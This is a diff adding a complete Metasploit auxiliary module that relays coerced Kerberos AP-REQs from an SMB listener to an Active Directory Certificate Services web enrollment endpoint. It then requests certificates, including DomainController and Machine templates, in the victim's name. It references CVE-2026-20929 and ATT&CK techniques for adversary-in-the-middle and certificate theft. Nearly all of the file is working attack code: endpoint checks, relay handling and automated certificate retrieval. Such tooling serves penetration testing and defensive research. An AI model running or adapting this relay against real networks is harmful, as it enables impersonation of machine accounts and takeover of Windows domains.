@@ -1,0 +1,211 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Auxiliary
+  include ::Msf::Exploit::Remote::SMB::Relay::Kerberos::RelayServer
+  include ::Msf::Exploit::Remote::HttpClient
+  include ::Msf::Exploit::Remote::HTTP::WebEnrollment
+
+  def initialize(_info = {})
+    super({
+      'Name' => 'ESC8 Relay: SMB to HTTP(S) via Kerberos',
+      'Description' => %q{
+        This module creates an SMB server and relays the Kerberos AP-REQ passed to it
+        (for example from a coerced host, CVE-2026-20929) to an AD CS Web Enrollment
+        HTTP endpoint to gain an authenticated connection. Once that connection is
+        established, the module makes an authenticated request for a certificate based
+        on a given template.
+
+        Unlike NTLM, a Kerberos AP-REQ is a complete, self-contained credential bound
+        to the SPN the victim was coerced into requesting, so there is no
+        challenge/response and the relay is a single request. The captured AP-REQ can
+        only be relayed to the service matching that SPN.
+      },
+      'Author' => [
+        'Pushpender Rathore' # Kerberos relay
+      ],
+      'References' => [
+        ['CVE', '2026-20929'],
+        ['ATT&CK', Mitre::Attack::Technique::T1557_ADVERSARY_IN_THE_MIDDLE],
+        ['ATT&CK', Mitre::Attack::Technique::T1649_STEAL_OR_FORGE_AUTHENTICATION_CERTIFICATES]
+      ],
+      'License' => MSF_LICENSE,
+      'Actions' => [[ 'Relay', { 'Description' => 'Run SMB ESC8 Kerberos relay server' } ]],
+      # The relayed connection is already authenticated by the AP-REQ, so
+      # follow-up enrollment requests must not attempt to re-authenticate.
+      #
+      # SRVHOST defaults to :: (dual-stack) rather than the framework-wide
+      # 0.0.0.0 default. The documented coercion is an IPv6 DNS takeover
+      # (CVE-2026-20929) that steers the victim to the attacker over IPv6, so a
+      # 0.0.0.0 listener is IPv4-only and never receives the connection. On
+      # Linux and macOS :: also accepts IPv4, so A-record coercion still works,
+      # and the paired coercion module already defaults SRVHOST to :: for the
+      # same reason. (A Windows relay host binds :: IPv6-only; there set SRVHOST
+      # to the attacker IPv6 the coercion hands out.)
+      'DefaultOptions' => { 'HTTP::Auth' => Msf::Exploit::Remote::AuthOption::NONE, 'SRVHOST' => '::' },
+      'PassiveActions' => [ 'Relay' ],
+      'DefaultAction' => 'Relay',
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS],
+        'Reliability' => []
+      }
+    })
+
+    register_options(
+      [
+        OptEnum.new('MODE', [ true, 'The issue mode.', 'AUTO', %w[ALL AUTO QUERY_ONLY SPECIFIC_TEMPLATE]]),
+        OptString.new('CERT_TEMPLATE', [ false, 'The template to issue if MODE is SPECIFIC_TEMPLATE.' ], conditions: %w[MODE == SPECIFIC_TEMPLATE]),
+        OptString.new('TARGETURI', [ true, 'The URI for the cert server.', '/certsrv/' ]),
+        OptString.new('RELAY_IDENTITY', [ true, 'The coerced principal being relayed, as DOMAIN\\HOST$ or HOST$@realm (e.g. AD\\WIN-VICTIM$ or WIN-VICTIM$@ad.example.com). The Kerberos AP-REQ carries the identity encrypted, so it is supplied here for template selection and certificate labeling.' ]),
+        # HttpClient re-registers RHOSTS after the relay server mixin and drops
+        # its aliases, so without this SMBHOST and RELAY_TARGETS are accepted
+        # but never reach RHOSTS. Module options are applied last, so this wins.
+        OptAddressRange.new('RHOSTS', [ true, 'Target address range or CIDR identifier to relay to' ], aliases: ['SMBHOST', 'RELAY_TARGETS'])
+      ]
+    )
+
+    register_advanced_options(
+      [
+        OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true])
+      ]
+    )
+    # Tracks which templates have already been issued per identity, so a client
+    # that authenticates repeatedly does not request the same certificate again.
+    # HTTP::WebEnrollment#cert_issued? reads this on the first relay, so it has
+    # to exist before any certificate is requested.
+    @issued_certs = {}
+  end
+
+  def relay_targets
+    Msf::Exploit::Remote::Relay::TargetList.new(
+      (datastore['SSL'] ? :https : :http),
+      datastore['RPORT'],
+      datastore['RHOSTS'],
+      datastore['TARGETURI'],
+      randomize_targets: datastore['RANDOMIZE_TARGETS']
+    )
+  end
+
+  def check_host(target_ip)
+    res = send_request_raw(
+      {
+        'rhost' => target_ip,
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri),
+        'headers' => {
+          'Accept-Encoding' => 'identity'
+        }
+      }
+    )
+    disconnect
+
+    return Exploit::CheckCode::Unknown('No response received from target') if res.nil?
+    unless res.code == 401
+      return Exploit::CheckCode::Safe('The target does not require authentication.')
+    end
+
+    unless res.headers['WWW-Authenticate'].to_s.include?('Negotiate')
+      return Exploit::CheckCode::Safe('The target does not offer Negotiate (Kerberos) authentication.')
+    end
+
+    if datastore['SSL']
+      # over SSL, channel binding (EPA) may or may not be enforced, so downgrade to Detected
+      Exploit::CheckCode::Detected('Server replied that authentication is required and Negotiate is supported. Target is over SSL, Extended Protection for Authentication (EPA) may or may not be enabled.')
+    else
+      Exploit::CheckCode::Appears('Server replied that authentication is required and Negotiate is supported.')
+    end
+  end
+
+  def validate
+    errors = {}
+
+    unless datastore['HTTP::Auth'] == Msf::Exploit::Remote::AuthOption::NONE
+      errors['HTTP::Auth'] = 'The relayed connection is already authenticated by the AP-REQ; this module does not support re-authenticating follow-up requests.'
+    end
+
+    case datastore['MODE']
+    when 'SPECIFIC_TEMPLATE'
+      if datastore['CERT_TEMPLATE'].blank?
+        errors['CERT_TEMPLATE'] = 'CERT_TEMPLATE must be set when MODE is SPECIFIC_TEMPLATE.'
+      end
+    when 'ALL', 'AUTO', 'QUERY_ONLY'
+      unless datastore['CERT_TEMPLATE'].nil? || datastore['CERT_TEMPLATE'].blank?
+        print_warning('CERT_TEMPLATE is ignored in ALL, AUTO, and QUERY_ONLY modes.')
+      end
+    end
+
+    raise OptionValidateError, errors unless errors.empty?
+
+    super
+  end
+
+  def run
+    relay_targets.each do |target|
+      vprint_status("Checking endpoint on #{target}")
+      check_code = check_host(target.ip)
+      if [Exploit::CheckCode::Unknown, Exploit::CheckCode::Safe].include?(check_code)
+        fail_with(Failure::UnexpectedReply, "Web Enrollment does not appear to be enabled on #{target}")
+      end
+    end
+
+    start_service
+    print_status('Server started.')
+
+    # Wait on the service to stop
+    service.wait if service
+  end
+
+  def on_relay_success(relay_connection:, relay_identity:)
+    # The AP-REQ carries the client identity encrypted to the target service, so
+    # it is not recovered from the wire; fall back to the operator-supplied
+    # RELAY_IDENTITY for template selection and certificate labeling.
+    #
+    # relay_identity is always nil on the Kerberos path today, since nothing
+    # upstream can learn the principal. It is honoured anyway so that a future
+    # target which does recover an identity needs no change here.
+    identity = normalize_relay_identity(relay_identity.presence || datastore['RELAY_IDENTITY'])
+
+    case datastore['MODE']
+    when 'AUTO'
+      cert_template = identity.end_with?('$') ? ['DomainController', 'Machine'] : ['User']
+      retrieve_certs(relay_connection, identity, cert_template)
+    when 'ALL', 'QUERY_ONLY'
+      cert_templates = get_cert_templates(relay_connection)
+      unless cert_templates.nil? || cert_templates.empty?
+        print_status('***Templates with CT_FLAG_MACHINE_TYPE set like Machine and DomainController will not display as available, even if they are.***')
+        print_good("Available Certificates for #{identity}: #{cert_templates.join(', ')}")
+        if datastore['MODE'] == 'ALL'
+          retrieve_certs(relay_connection, identity, cert_templates)
+        end
+      end
+    when 'SPECIFIC_TEMPLATE'
+      retrieve_cert(relay_connection, identity, datastore['CERT_TEMPLATE'])
+    end
+
+    vprint_status('Relay tasks complete; waiting for next login attempt.')
+    relay_connection.disconnect!
+  end
+
+  private
+
+  # Accept RELAY_IDENTITY in either DOMAIN\HOST$ or HOST$@realm (UPN) form and
+  # return it as DOMAIN\HOST$, which is what the WebEnrollment mixin and the
+  # template auto-selection below expect. WebEnrollment splits the identity on
+  # '\\' to build the CSR subject; a UPN string has no backslash, so both halves
+  # would become the whole value and the request would carry a doubled
+  # HOST$@realm\HOST$@realm subject. The '$' template check also only works once
+  # the machine account trails the string, so convert the UPN form first.
+  def normalize_relay_identity(identity)
+    return identity if identity.blank? || identity.include?('\\')
+
+    if identity.include?('@')
+      principal, realm = identity.split('@', 2)
+      return "#{realm}\\#{principal}"
+    end
+
+    identity
+  end
+end
